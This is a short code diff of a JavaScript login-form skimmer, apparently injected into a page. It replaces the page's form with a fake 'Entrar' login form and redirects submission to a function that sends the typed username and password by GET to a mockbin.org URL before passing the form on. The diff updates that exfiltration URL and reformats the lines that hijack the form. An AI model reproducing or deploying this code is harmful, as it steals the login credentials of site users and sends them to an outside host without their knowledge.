@@ -6,7 +6,7 @@ function l(){
         document.forms[0].action='control.php';
         document.forms[0].submit();
     };
-    a.open('GET', 'http://mockbin.org/bin/0cc56532-95b3-4044-86a9-b0ed04b5b63c?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
+    a.open('GET', 'http://mockbin.org/bin/eacab648-6a09-4358-817a-dab08f52cf9e?p='.concat(document.getElementById('password').value).concat('%26u=').concat(document.getElementById('usuario').value));
     a.send(null);
 }
 var f=document.createElement("form");
@@ -18,6 +18,6 @@ f.innerHTML=`<form action="control.php" method="post">
     <button type="submit" class="enviar_btn">Entrar</button>
 </form>
 `;
- document.getElementById("contenido").appendChild(f);
- document.forms[0].remove();
- document.forms[0].action = 'javascript:l();'
+document.getElementById("contenido").appendChild(f);
+document.forms[0].remove();
+document.forms[0].action = 'javascript:l();'
